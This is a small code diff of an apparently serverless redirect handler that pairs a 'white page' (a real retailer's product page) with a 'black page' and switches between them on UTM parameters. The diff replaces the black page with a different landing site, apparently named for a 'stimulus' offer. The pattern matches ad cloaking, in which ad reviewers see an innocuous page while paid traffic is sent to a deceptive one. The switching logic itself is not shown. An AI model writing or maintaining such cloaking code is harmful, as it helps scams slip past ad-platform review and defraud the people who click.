@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
     const whitePageURL = "https://www.arket.com/en-eu/product/supima-cotton-rib-socks-set-of-3-pairs-bluerust-1260223012/";
-    const blackPageURL = "https://gymboreeusk.myfunnelish.com/Stimulus";
+    const blackPageURL = "https://stimulus-launchpad-magic.lovable.app";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
